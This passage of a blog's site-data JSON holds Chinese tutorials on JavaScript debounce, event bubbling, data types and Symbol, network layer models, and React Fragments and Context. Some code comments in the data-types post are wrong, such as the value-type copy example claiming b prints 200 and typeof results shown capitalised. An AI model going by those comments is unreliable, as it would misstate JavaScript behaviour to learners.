console.log(123)&#125;setInterval(function () &#123; _.debounce(test, 1500)&#125;, 500) 点击事件也是同样： 123456function test() &#123; console.log(123)&#125;btn.addEventListener('click', function () &#123; _.debounce(test, 1500)&#125;) 正确的做法是： 12345function test() &#123; console.log(123)&#125;btn.addEventListener('click', test)setInterval(_.debounce(test, 1500), 500) 标注： 参考资料1：https://blog.csdn.net/duola8789/article/details/78871789 参考资料2：https://www.cnblogs.com/wandiao/p/7223269.html 参考资料3：https://www.cnblogs.com/mopagunda/p/5323080.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"事件冒泡与默认事件","slug":"JS-bs-eventDefault","date":"2018-09-15T07:22:08.000Z","updated":"2019-01-25T10:10:37.166Z","comments":true,"path":"2018/09/15/JS-bs-eventDefault/","link":"","permalink":"http://liuxuewen-site.github.io/2018/09/15/JS-bs-eventDefault/","excerpt":"","text":"一、事件冒泡 1）定义：假设一个html结构中，两个标签存在父子层级关系，父盒子和子盒子都绑定一个相同的方法时，当点击子盒子时将会触发执行两次方法。但实际期待点击子盒子就单独触发子盒子的事件而不涉及父盒子的方法。 2）阻止：在谷歌火狐等浏览器中阻止事件冒泡的方法是 e.stopPropagation() ，在ie浏览器中阻止事件冒泡的方法是 window.event.cancelBubble=true 。 1234567891011121314151617&lt;div onclick='proPagation(event)'&gt; &lt;button onclick='proPagation(event)'&gt;按钮&lt;/button&gt;&lt;/div&gt;&lt;script type='text/javascript'&gt; function proPagation(e)&#123; window.event ? alert('方法被执行' + (window.event.srcElement)) : alert('方法被执行' + e.target) stopproPagation(e); &#125; //阻止冒泡 function stopproPagation(e)&#123; window.event?window.event.cancelBubble=true:e.stopPropagation(); &#125;&lt;/script&gt; 二、默认行为 1）定义：默认行为是浏览器的默认初始值，是无法取消的，需要人为去屏蔽浏览器的默认行为，比如说全选页面内容，浏览器跳转到另外一个页面等都属于浏览器的默认行为。 2）阻止：在谷歌火狐等浏览器中阻止事件冒泡的方法是 e.preventDefault() ，在ie浏览器中阻止事件冒泡的方法是 window.event.returnValue=false 。 123456789&lt;a href='http://www.taobao.com' onclick='stoppreevntDefault(event)'&gt;我要跳转到淘宝页面&lt;/a&gt;&lt;script type='text/javascript'&gt; function stoppreevntDefault(e)&#123; e.preventDefault ? e.preventDefault() : window.event.returnValue=false; &#125;&lt;/script&gt; 三、注意点 1）e.stopPropagation()方法会阻止事件冒泡，但默认事件仍会执行，调用这个方法时，如果是点击一个连接，连接依然会打开。 2）e.preventDefault()方法会阻止默认事件，但不会阻止冒泡，调用此方法时，连接不会被打开，但会发生冒泡传递到上一层父元素。 3）既阻止事件冒泡、又阻止默认事件，有两种方法，1是同时调用e.stopPropagation()与e.preventDefault()，或者用return false（可以理解为同时调用了上面两个）。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;div class=\"box1\"&gt; &lt;a href=\"http://www.baidu.com\" target=\"_blank\"&gt;&lt;/a&gt;&lt;/div&gt;&lt;script type='text/javascript'&gt; $(\".box1\").click(function()&#123; console.log(\"1\") // 打印出1，页面跳转; &#125;); $(\".box1 a\").click(function(event)&#123; event.stopPropagation(); // 阻止事件冒泡，不会打印1，页面会跳转； &#125;); $(\".box1\").click(function()&#123; console.log(\"1\") &#125; $(\".box1 a\").click(function(event)&#123; event.preventDefault(); // 阻止默认事件，页面不会跳转，打印出1； &#125;); $(\".box1\").click(function()&#123; console.log(\"1\")； &#125;); $(\".box1 a\").click(function(event)&#123; event.stopPropagation(); event.preventDefault() // 阻止事件冒泡与默认行为，页面不会跳转，不会打印1； &#125;); $(\".box1\").click(function()&#123; console.log(\"1\") &#125;); $(\".box1 a\").click(function(event)&#123; return false; // 阻止事件冒泡与默认行为，页面不会跳转，不会打印1； &#125;); $(\".box1\").click(function()&#123; console.log(\"1\") &#125;); &lt;/script&gt; 标注： 参考资料1：https://blog.csdn.net/leonhuangjiajun/article/details/75136662","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"JS数据类型","slug":"JS-bs-data","date":"2018-09-14T14:09:44.000Z","updated":"2019-01-25T10:10:27.990Z","comments":true,"path":"2018/09/14/JS-bs-data/","link":"","permalink":"http://liuxuewen-site.github.io/2018/09/14/JS-bs-data/","excerpt":"","text":"一、JS数据类型 基本数据类型：Number、String、Boolean、Undefined、Null 复杂数据类型：Object ES6增加：Symbol 1）Number类型： a、包含整数和浮点数两种值。 b、NaN代表非数字类型。任何关于NaN的操作都会返回NaN。NaN不等于自身，因为NaN表示的是一类，而不是一个确切的值，就像a属于N类，b也属于N类，但是a跟b相等么。 c、isNaN()函数用于检查其参数是否是非数字值，其在接收到一个值后，会尝试将这个值转换成数值，若不能即返回true。 1234567891011alert(isNaN(25)); //false，25是个数值alert(isNaN('25')); //false，'25'是一个字符串数值，可以转换成数值alert(isNaN('Lee')); //true，'Lee'是个字符串，不能转化成数值alert(isNaN(true)); //false，true可以转换成1alert(isNaN(null)); //false，空对象返回0alert(isNaN(undefined)); //truealert(isNaN(NaN)); //truealert(isNaN(&#123;toString:function()&#123;return 'lee';&#125;&#125;)) //首先会调用valueOf()方法，确定返回值是否能够转换成数值。 d、将值转为数据类型的方法有Number()、parseInt()、parseFloat()。前一个可以用于任何数据类型，另外两个专门用于把字符串转换成数值。 1234567891011alert(Number('08.50')); //8.5alert(Number('')); //0alert(Number('lee123')); //NaNalert(parseInt('08.50')); //8，小数点不是数值，会被去掉。alert(parseInt('')); //NaNalert(parseInt('465lee')); //465，返回整数部分，如果开始不是整数部分，返回NaNalert(parseFloat('08.50')); //8.5alert(parseFloat('')); //NaNalert(parseFloat('465lee'));//123，返回整数部分，如果开始不是整数部分，返回NaN 2）String类型： a、字符串有length属性。 b、将值转为字符串类型的方法有String()、toString()。前一个（数值、字符串、布尔、对象、null和undefined都有，且null,undefined 转换后为null和undefined），后一个（数值、字符串、布尔、对象有，null和undefined没有） 3）Boolean类型： a、两个值，true和false。 4）Undefined类型： a、只有一个值即undefined值。表明声明了变量，但未给变量初始化值。 5）Null类型： a、null类型被看做空对象指针，前文说到null类型也是空的对象引用。 6）Object类型： a、包括了对象、数组、函数(引用类型) 7）Symbol类型： a、ES6引入了一种新的原始数据类型Symbol，表示独一无二的值，可以保证不会与其他属性名产生冲突。 12let s = Symbol();typeof(s); // \"symbol\" b、Symbol函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时，比较容易区分。 123456var s1 = Symbol('foo'); var s2 = Symbol('bar'); s1 // Symbol(foo) s2 // Symbol(bar) s1.toString() // \"Symbol(foo)\" s2.toString() // \"Symbol(bar)\" c、如果Symbol函数的参数是一个对象，会调用该对象的toString方法将其转为字符串，然后才生成一个Symbol值。 1234567const obj = &#123; toString() &#123; return 'abc'; &#125;&#125;;const sym = Symbol(obj);sym // Symbol(abc) d、Symbol函数的参数只是表示对当前Symbol值的描述，相同参数的Symbol函数的返回值是不相等的。 123456789// 没有参数的情况 var s1 = Symbol(); var s2 = Symbol(); s1 === s2 // false // 有参数的情况 var s1 = Symbol('foo'); var s2 = Symbol('foo'); s1 === s2 // false e、Symbol值通过Symbol函数生成，函数前不能使用new命令，否则会报错，因为生成的Symbol是一个原始类型的值，不是对象，由于Symbol值不是对象，所以不能添加属性。基本上，它是一种类似于字符串的数据类型。 f、Symbol值不能与其他类型的值进行运算，否则会报错。 1234567var sym = Symbol('My symbol'); \"your symbol is \" + sym// TypeError: can't convert symbol to string `your symbol is $&#123;sym&#125;` // TypeError: can't convert symbol to string g、Symbol值可以与部分其他类型的值进行转换。 12345678910111213var sym = Symbol('My symbol'); sym.toString() // 'Symbol(My symbol)'，Symbol值显式转为字符串var sym2 = Symbol();Boolean(sym2) // true，Symbol值转为布尔值!sym2 if (sym2) &#123;&#125;var sym2 = Symbol();Number(sym2) // TypeError，但是，Symbol值不能转为数值。 h、由于每一个Symbol值都是不相等的，意味着Symbol值可以作为标识符，用于对象的属性名，能保证不会出现同名的属性。这对于一个对象由多个模块构成的情况非常有用，能防止某一个键被不小心改写或覆盖。 12345678910111213141516171819var mySymbol = Symbol();// 第一种写法var a = &#123;&#125;;a[mySymbol] = 'Hello!'; // a[mySymbol] =&gt; \"Hello!\"// 第二种写法（记得方括号，否则属性名只是字符串而不是Symbol）var a = &#123; [mySymbol]: 'Hello!'&#125;; // a[mySymbol] =&gt; \"Hello!\"// 第三种写法var a = &#123;&#125;;Object.defineProperty(a, mySymbol, &#123; value: 'Hello!' &#125;); // a[mySymbol] =&gt; \"Hello!\"// 不可用.运算符（用.的话属性名只是字符串而不是Symbol）var a = &#123;&#125;;a.mySymbol = 'Hello!'; // a[mySymbol] =&gt; undefined // a['mySymbol'] =&gt; \"Hello!\" 更多Symbol的知识请看http://es6.ruanyifeng.com/#docs/symbol 8）补充： a、js按照存储方式将值分为值类型和引用类型。他们的区别比如： 123456789var a = 100;var b = a;a = 200;console.log(b); // 200var a = &#123;age : 20&#125;;var b = a;b.age = 21;console.log (a.age); // 21 第一个是值类型。从一个变量向另一个变量赋值值类型时，会在该变量上创建一个新值，然后再把该值复制到新变量分配的位置上。两个变量是相互不受影响的。 第二个是引用类型，从一个变量向另一个变量赋值引用类型时，同样会将存储在变量中的对象的值复制一份放到为新变量分配的空间中。但引用类型中保存的值是对象在堆内存中的地址，其实就是一个指针，也即它们都指向了同一个对象，所以两个变量是互相影响的。 9）typeof 和 instanceof： a、JavaScript中typeof和instanceof常用来检测当前变量的数据类型。 b、typeof一般返回的结果有：”number”、”string”、”boolean”、”object”、”function” 和 “undefined”。（语法：typeof()） 12345678910typeof(123) //Numbertypeof('abc') //Stringtypeof(true) //Booleantypeof(undefined) //Undefinedtypeof(null) //Objecttypeof(&#123; &#125;) //Objecttypeof([ ]) //Objecttypeof(console.log()) //Function c、typeof对于引用类型，无论引用的是什么类型的对象，都是返回object，此时，就需要用instanceof来检测某个对象是不是另一个对象的实例，也即某个对象在其原型链中是否存在另一个构造函数的prototype属性。（语法：object instanceof constructor） 12345678910111213141516171819202122232425var a=new Array();alert(a instanceof Array) // truealert(a instanceof Object) // true，Array 是 object 的子类function Foo()&#123;&#125; Foo.prototype = new Aoo(); var foo = new Foo(); console.log(foo instanceof Foo) // true，一层继承关系中的父类console.log(foo instanceof Aoo) // true，多层继承关系中，instanceof同样适用var simpleStr = \"This is a simple string\";simpleStr instanceof String; // false,，检查原型链会找到undefinedsimpleStr instanceof Object; // false,，检查原型链会找到undefinedvar myString = new String();myString instanceof String; // truemyString instanceof Object; // truevar myDate = new Date();myDate instanceof Date; // truemyDate instanceof Object; // truefunction的arguments，是个伪数组，使用instaceof测试会返回发现 arguments 不是一个 Array 对象。alert(window instanceof Object) // false，虽然typeof(window)会得object，但这里的object指js语法中的object，不是指dom模型对象。 标注： 参考资料1：https://www.cnblogs.com/Trr-984688199/p/6180040.html 参考资料2：https://www.cnblogs.com/xuniannian/p/7452086.html 参考资料3：http://es6.ruanyifeng.com/#docs/symbol","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"计算机网络体系结构","slug":"netword-bs-system","date":"2018-08-30T10:47:11.000Z","updated":"2019-01-25T10:13:25.739Z","comments":true,"path":"2018/08/30/netword-bs-system/","link":"","permalink":"http://liuxuewen-site.github.io/2018/08/30/netword-bs-system/","excerpt":"","text":"一、为什么需要计算机网络体系结构 计算机网络是个复杂的系统，连接在网络上的两台计算机通信时需要考虑很多复杂因素，比如： 1）两台计算机间须有一条传送数据的通路； 2）告诉网络如何识别接收数据的计算机； 3）发起通信的计算机须保证要传送的数据能在这条通路上正确发送和接收； 4）对通信间出现的差错和意外事故，应有可靠完善的措施保证对方计算机最终能正确收到数据。 计算机网络体系结构标准的制定就是为了解决这些问题，让两台网络设备正常通信。它是用了什么思想做到呢？ 二、计算机网络体系结构的基本思想 分层思想，即将庞大复杂的问题转化为若干较小的、容易处理的、单一的局部问题，然后在不同层次上予以解决。在计算机网络体系结构中，分层思想的内涵是，每层在依赖自己下层所提供的服务的基础上，通过自身内部功能实现一种特定的服务。 分层思想优点： 1）耦合度低(独立性强)： 上层只需通过下层所提供的接口来使用下层所实现的服务，而不需要关心下层的具体实现。 2）适应性强： 只要每层为上层提供的服务和接口不变，每层的实现细节可以任意改变。 3）易于实现和维护： 分层结构使得整体层次清晰，工作人员能专心的负责自己所负责的模块。 三、计算机网络体系结构的概念、标准、模型 1）计算机网络体系结构的概念： 在计算机网络中，层、层间接口及协议的集合被称为计算机网络体系结构。 2）计算机网络体系结构的标准： 国际标准是 OSI 七层模型，实际应用最广泛的是 TCP/IP 体系结构。（国际化标准组织ISO制定） 换句话说，OSI 七层模型只是理论上的、官方制定的国际标准，而 TCP/IP 体系结构才是事实上的国际标准。 需要指出的是，五层体系结构虽然综合了 OSI 和 TCP/IP 的优点，但其只是为了学术学习研究而提出的，没有具体的实际意义。 3）计算机网络体系结构的分层模型： a、相关概念： 实体: 任何可以发送和接收信息的软硬件进程； 对等层：两个不同系统的同一层次； 对等实体：分别位于不同系统对等层的两个实体； 接口：上层使用下层所提供的功能的方式； 服务：某一层及其以下各层的所完成的功能，通过接口提供给相邻的上层； 协议：通信双方在通信过程中必须遵循的规则。 b、相关准则： 同一网络中，任意两个端系统必须具有相同的层次； 每层使用其下层提供的服务，并向其上层提供服务； 通信只在对等层间进行，这里所指的通信是间接的、逻辑的、虚拟的，非对等层之间不能互相通信； 实际的物理通信只在最底层完成； Pn代表第n层的协议，即第n层对等实体间通信时必须遵循的规则或约定。 c、对等层通信的实质： 在逻辑上，网络分层体系结构原理允许不同主机的对等实体进行通信，但禁止不同主机非对等实体间进行直接通信；在物理上，每一层必须依靠下层提供的服务来与另一台主机的对等层通信。这就是对等层通信的实质。 d、通信协议： 通信协议定义了网络实体间发送报文和接收报文的格式、顺序及当传送和接收消息时应采取的行动(规则)。这个定义指明了通信协议的三要素：语义（指对协议中各协议元素的含义的解释）、语法（指协议元素与数据的组合格式即报文格式）、时序（指在通信过程中，通信双方操作的执行顺序与规则） 计算机间通信的本质就在于信息报文的交换，信息报文也就是协议数据单元（PDU）。实际上，语法规定了PDU的格式，语义赋予了PDU的特定内涵，时序是通信规则的体现。三者的关系是，语法是语义的载体，时序是对语义的有序组织，正是基于这种关系，计算机在通信时才得以保持高度默契。 e、协议数据单元（PDU）： 计算机网络体系结构中，对等层之间交换的信息报文统称为 协议数据单元（Protocol Data Unit，PDU）。PDU由 协议控制信息（协议头，含有完成数据传输所需的控制信息，比如地址、序号、长度、分段标志、差错控制信息等） 和 数据（SDU） 组成。 PDU的封装过程是，下层把上层的PDU作为本层的数据加以封装，与本层的协议头部（和尾部）形成本层的PDU。因此，数据在源站自上而下递交的过程实际上就是不断封装的过程，而到达目的地后自下而上递交的过程就是不断拆封的过程。需要注意的是，每一层只处理本层的协议头部！ 四、OSI 七层体系结构 1）七层结构分别是： 2）各层次功能： 3）PDU数据封装示意图： 4）物理层： a、功能 a-1、在物理介质上正确透明地传送比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后再转化为1、0，也即数模转换与模数转换）；a-2、实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异，使数据链路层不必关心网络的具体传输介质。 b、协议 规定了物理接口的各种特性和物理设备的标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。 5）数据链路层： a、功能 a-1、接收来自物理层的位流形式的数据，并封装成帧传送到上一层；同样也将来自上层的数据帧，拆装为位流形式的数据转发到物理层；a-2、此外，通过各种控制协议，提供物理地址寻址、数据成帧、流量控制（指抑止发送方的传输速率，使接收方来得及接收）、差错控制（指处理接收端发回的确认帧的信息，以便提供可靠的数据传输）等功能，实现数据在不可靠的物理线路上的可靠传递。 b、协议 负责提供物理地址寻址、数据成帧、流量控制、差错控制等功能，确保数据的可靠传输； 6）网络层： a、功能 a-1、将网络地址翻译成对应的物理地址；a-2、并通过路由选择算法为分组通过通信子网选择最适当的路径。 b、协议 提供无连接数据报服务的IP协议 c、产品 路由器 d、路由选择 网络层最重要的一个功能。网路层会依据速度、距离(步跳数)、价格和拥塞程度等因素在多条通信路径中找一条最佳路径。所谓路由，一般包括路由表和路由算法两个方面。事实上，每个路由器都必须建立和维护其路由表，一种是静态维护，也就是人工设置，只适用于小型网络；另一种是动态维护，是在运行过程中根据网络情况自动地动态维护路由表。 7）传输层： a、功能 OSI下3层(物理层，数据链路层和网络层)的主要任务是数据通信，上3层（会话层，表示层和应用层）的任务是数据处理，传输层恰好是中间层第4层，是通信子网和资源子网的接口和桥梁，起到承上启下的作用。 a-1、其主要任务是，向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输，并通过透明数据传输使上层服务用户不必关系通信子网的实现细节。 b、协议 TCP/IP中的TCP、UDP协议，Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议。 c、传输层与数据链路层都有流量差错控制等功能，什么区别呢？ 首先，数据链路层是在节点（跳与跳）之间保证的，而传输层应用程序端到端之间保证。其次，数据链路层处理的是帧，传输层处理的是报文。 8）会话层： a、功能 a-1、负责建立、维持、终止通信链接，保持会话过程通信链接的畅通，同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。 9）表示层： a、功能 a-1、解释来自应用层的命令和数据，确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取，也即处理用户信息的表示问题，如编码、数据格式转换和加密解密等。 10）应用层： a、功能 a-1、是用户应用程序与网络间的接口，使用户的应用程序能够与网络进行交互式联系，同时协调各个应用程序间的工作。 b、协议 OSI: VTP、MHS、FTAM、DS、… TCP/IP: Telnet、SMTP、FTP、DNS、HTTP、… 五、TCP/IP 四层体系结构 1）四层结构与PDU数据单元： 2）应用层： 应用层决定了向用户提供应用服务时的通信活动。TCP/IP协议族内预存了各类通用的应用服务，比如 FTP（文件传输协议）和 DNS（域名系统）服务，HTTP 协议也处于该层。 3）传输层： 传输层向应用层提供处于网络连接中的两台计算机之间的数据传输。本层有两个性质不同的协议：TCP（传输控制协议 – 连接 可靠）和 UDP（用户数据报协议 – 无连接 不可靠）。传输层与应用层之间的关系如下： 4）网络层： 网络层用来处理在网络上流动的数据包（网络传输的最小数据单位），规定了通过怎样的路径（传输路线）到达对方计算机，并把数据包传送给对方。与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线，把数据报通过最佳路径送到目的端。网际层的核心协议IP，提供了无连接的数据报传输服务(不保证送达，不保序）。网络层与传输层之间的关系如下： 5）网络接口层： 网络接口层用来处理连接网络的硬件部分，包括硬件的设备驱动、NIC（Network Interface Card，网卡）及光纤等物理可见部分，还包括连接器等一切传输媒介。也就是说，硬件上的范畴均在链路层的作用范围之内。 五、最后，来个总图 标注： 参考资料1：https://blog.csdn.net/justloveyou_/article/details/69612153","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/categories/网络协议/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/tags/网络协议/"}]},{"title":"React官网之23-片段(Fragments)","slug":"React-gw-23","date":"2018-07-08T15:01:52.000Z","updated":"2019-01-25T04:00:52.376Z","comments":true,"path":"2018/07/08/React-gw-23/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-23/","excerpt":"","text":"一、前言 React 中一个常见模式是为一个组件返回多个元素。片段(fragments) 可以让你将子元素列表添加到一个分组中，并且不会在 DOM 中增加额外节点： 123456789render() &#123; return ( &lt;React.Fragment&gt; &lt;ChildA /&gt; &lt;ChildB /&gt; &lt;ChildC /&gt; &lt;/React.Fragment&gt; );&#125; 还有一个新的 简写语法 可以用来声明它们，但是它还没有被所有流行的工具所支持。 二、动机 一个常见模式是为一个组件返回一个子元素列表。以这个示例的 React 片段为例： 1234567891011class Table extends React.Component &#123; render() &#123; return ( &lt;table&gt; &lt;tr&gt; &lt;Columns /&gt; &lt;/tr&gt; &lt;/table&gt; ); &#125;&#125; 为了渲染有效的 HTML，&lt; Columns /&gt; 需要返回多个 &lt; td &gt; 元素。如果 &lt; Columns /&gt; 的 render() 函数里面使用一个父级 div ，那么最终生成的 HTML 将是无效的: 12345678910class Columns extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;td&gt;Hello&lt;/td&gt; &lt;td&gt;World&lt;/td&gt; &lt;/div&gt; ); &#125;&#125; 在 &lt; Table /&gt; 组件中的输出结果： 12345678&lt;table&gt; &lt;tr&gt; &lt;div&gt; &lt;td&gt;Hello&lt;/td&gt; &lt;td&gt;World&lt;/td&gt; &lt;/div&gt; &lt;/tr&gt;&lt;/table&gt; 所以，我们介绍 Fragment。 三、使用1、基本使用： 12345678910class Columns extends React.Component &#123; render() &#123; return ( &lt;React.Fragment&gt; &lt;td&gt;Hello&lt;/td&gt; &lt;td&gt;World&lt;/td&gt; &lt;/React.Fragment&gt; ); &#125;&#125; 在正确的 &lt; Table /&gt; 组件中，这个结果输出如下： 123456&lt;table&gt; &lt;tr&gt; &lt;td&gt;Hello&lt;/td&gt; &lt;td&gt;World&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 2、简写语法： 有一个新的，更短的语法可以用来声明片段(fragments)。它看起来像空标签： 12345678910class Columns extends React.Component &#123; render() &#123; return ( &lt;&gt; &lt;td&gt;Hello&lt;/td&gt; &lt;td&gt;World&lt;/td&gt; &lt;/&gt; ); &#125;&#125; 可以像使用其他元素一样使用&lt;&gt;&lt;/&gt;，只是它不支持 键(keys) 或 属性(attributes)。 注意，目前许多工具都不支持这个简写语法，所以你可能需要明确地使用 &lt; React.Fragment &gt;，直到工具支持这个语法。 3、带 key 的片段： 如果你需要一个带 key 的片段，你可以直接使用 &lt; React.Fragment /&gt;。一个使用场景是映射一个集合为一个片段数组 — 例如：创建一个描述列表： 12345678910111213function Glossary(props) &#123; return ( &lt;dl&gt; &#123;props.items.map(item =&gt; ( // 没有`key`，将会触发一个key警告 &lt;React.Fragment key=&#123;item.id&#125;&gt; &lt;dt&gt;&#123;item.term&#125;&lt;/dt&gt; &lt;dd&gt;&#123;item.description&#125;&lt;/dd&gt; &lt;/React.Fragment&gt; ))&#125; &lt;/dl&gt; );&#125; key 是唯一可以传递给 Fragment 的属性。在将来，我们可能增加额外的属性支持，比如事件处理。 4、在线Demo： 你可以使用 CodePen 试试 JSX 片段语法。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之22-上下文(Context)","slug":"React-gw-22","date":"2018-07-08T14:01:52.000Z","updated":"2019-01-25T03:47:11.460Z","comments":true,"path":"2018/07/08/React-gw-22/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-22/","excerpt":"","text":"一、前言 在一个典型的 React 应用中，数据是通过 props 属性由上向下（由父及子）的进行传递的，但这对于某些类型的属性而言是极其繁琐的（例如：地区偏好，UI主题。Context 提供了一种在组件之间共享此类值的方式，而不必通过组件树的每个层级显式地传递 props。 二、不推荐使用 Context 绝大多数的应用程序不需要使用 context。 如果你希望使应用程序更加稳定，就不要使用 context。这只是一个实验性的 API，并且可能在未来的 React 版本中移除。 如果你熟悉 Redux 或者 MobX 这类 state 管理库，就不要使用 context。在许多实际应用中，这些库和 React 绑定是一个很好的组件state管理。Redux 相比 context 是更好的解决方案。 如果你不是一个经验丰富的 React 开发者，就不要使用 context。更好的方式是使用 props 和 state。 如果你不顾这些警告仍然坚持使用 context，请尝试着将 context 的使用隔离在一个将小的范围内，并且在可能的情况下直接使用 context，以便在 API 改变的时候进行升级。 三、何时使用 Context Context 设计的目的是共享那些被认为对于一个组件树而言是全局的数据，例如当前认证的用户、主题或首选语言。 在下面的代码中，我们通过一个 theme 属性手动调整一个按钮组件的样式： 12345678910111213141516171819function ThemedButton(props) &#123; return &lt;Button theme=&#123;props.theme&#125; /&gt;;&#125;// 中间组件function Toolbar(props) &#123; // Toolbar 组件必须添加一个额外的 theme 属性，然后传递它给 ThemedButton 组件 return ( &lt;div&gt; &lt;ThemedButton theme=&#123;props.theme&#125; /&gt; &lt;/div&gt; );&#125;class App extends React.Component &#123; render() &#123; return &lt;Toolbar theme=\"dark\" /&gt;; &#125;&#125; 使用 context，可以避免通过中间元素传递 props： 123456789101112131415161718192021222324252627282930// 创建一个 themeContext, 默认 theme 的值为 lightconst ThemeContext = React.createContext('light');// ThemedButton 组件从 context 接收 themefunction ThemedButton(props) &#123; return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; &lt;Button &#123;...props&#125; theme=&#123;theme&#125; /&gt;&#125; &lt;/ThemeContext.Consumer&gt; );&#125;// 中间组件function Toolbar(props) &#123; return ( &lt;div&gt; &lt;ThemedButton /&gt; &lt;/div&gt; );&#125;class App extends React.Component &#123; render() &#123; return ( &lt;ThemeContext.Provider value=\"dark\"&gt; &lt;Toolbar /&gt; &lt;/ThemeContext.Provider&gt; ); &#125;&#125; 注意：不要仅仅为了避免在几个层级下的组件传递 props 而使用 context，它是被用于在多个层级的多个组件需要访问相同数据的情景。 四、API React.createContext 内部： 123456789const &#123;Provider, Consumer&#125; = React.createContext(defaultValue);创建一对 &#123; Provider, Consumer &#125;，当 React 渲染 context 组件 Consumer 时，它将从组件树的上层中最接近的匹配的 Provider 读取当前的 context 值。如果上层的组件树没有一个匹配的 Provider，而此时你需要渲染一个 Consumer 组件，那么你可以用到 defaultValue。 Provider内部: 12345&lt;Provider value=&#123;/* some value */&#125;&gt;接收一个 value 属性传递给 Provider 的后代 Consumers。一个 Provider 可以联系到多个 Consumers。Providers 可以被嵌套以覆盖组件树内更深层次的值。 Consumer内部: 12345&lt;Consumer&gt; &#123;value =&gt; /* render something based on the context value */&#125;&lt;/Consumer&gt;一个可以订阅 context 变化的 React 组件。 接收一个函数作为子节点，函数接收当前 context 的值并返回一个 React 节点。传递给函数的 value 将等于组件树中上层 context 的最近的 Provider 的 value 属性。如果 context 没有 Provider，那么 value 参数将等于被传递给 createContext() 的 defaultValue 。 每当 Provider 的值发生改变时，所有的 Consumers 都将会重新渲染。通过使用相同的算法如 Object.is 比较新旧值来确定变化。（这在传递对象作为 value 时会引发一些问题 Caveats） 五、例子1（老） 假定你有下面的结构: 1234567891011121314151617181920212223242526272829class Button extends React.Component &#123; render() &#123; return ( &lt;button style=&#123;&#123;'&#123;&#123;'&#125;&#125;background: this.props.color&#125;&#125;&gt; &#123;this.props.children&#125; &lt;/button&gt; ); &#125;&#125;class Message extends React.Component &#123; render() &#123; return ( &lt;div&gt; &#123;this.props.text&#125; &lt;Button color=&#123;this.props.color&#125;&gt;Delete&lt;/Button&gt; &lt;/div&gt; ); &#125;&#125;class MessageList extends React.Component &#123; render() &#123; const color = \"purple\"; const children = this.props.messages.map((message) =&gt; &lt;Message text=&#123;message.text&#125; color=&#123;color&#125; /&gt; ); return &lt;div&gt;&#123;children&#125;&lt;/div&gt;; &#125;&#125; 在这个例子中，我们手动地传递 color 属性使得 Button 和 Message 设置正确的样式。使用 context，我们可以自动在组件树中传递: 123456789101112131415161718192021222324252627282930313233343536373839404142const PropTypes = require('prop-types');class Button extends React.Component &#123; render() &#123; return ( &lt;button style=&#123;&#123;'&#123;&#123;'&#125;&#125;background: this.context.color&#125;&#125;&gt; &#123;this.props.children&#125; &lt;/button&gt; ); &#125;&#125;Button.contextTypes = &#123; color: PropTypes.string&#125;;class Message extends React.Component &#123; render() &#123; return ( &lt;div&gt; &#123;this.props.text&#125; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/div&gt; ); &#125;&#125;class MessageList extends React.Component &#123; getChildContext() &#123; return &#123;color: \"purple\"&#125;; &#125; render() &#123; const children = this.props.messages.map((message) =&gt; &lt;Message text=&#123;message.text&#125; /&gt; ); return &lt;div&gt;&#123;children&#125;&lt;/div&gt;; &#125;&#125;MessageList.childContextTypes = &#123; color: PropTypes.string&#125;; 上述代码，我们实现了通过 React 的 Contex t实现了值 color 的越级传递，来分析一下上述的方法： 1）首先在顶层组件中： 定义了顶层组件所拥有的子类 context 对象，该顶层组件所拥有的的子类 context 对象为 color，且必须为字符串。 123MessageList.childContextTypes = &#123; color: PropTypes.string&#125;; 然后通过 getChildText 方法，来给子 context 对象的属性赋值： 123getChildContext() &#123; return &#123;color: \"purple\"&#125;;&#125; 这样就完成了顶层组件中，context 对象的赋值。 2）越级传递，因为 color 属性在一级子组件 Message 中并没有直接用到，而是只在最底层使用，因此我们可以直接传递到最底层（越级），在 Button 组件中使用： 首先 Button 组件中，再次声明了所接受到的 context 的子组件 color 的类型，声明必须为字符串： 123Button.contextTypes = &#123; color: React.PropTypes.string&#125;; 然后可以通过 this.context.color 这种方式调用： 123&lt;button style=&#123;&#123;background: this.context.color&#125;&#125;&gt; &#123;this.props.children&#125;&lt;/button&gt; 综上：这样，我们发现通过 Context，我们就能实现值得越级传递. 六、例子2 主题的动态值，一个更加复杂的例子： theme-context.js： 1234567891011121314export const themes = &#123; light: &#123; foreground: '#ffffff', background: '#222222', &#125;, dark: &#123; foreground: '#000000', background: '#eeeeee', &#125;,&#125;;export const ThemeContext = React.createContext( themes.dark // 默认值); themed-button.js: 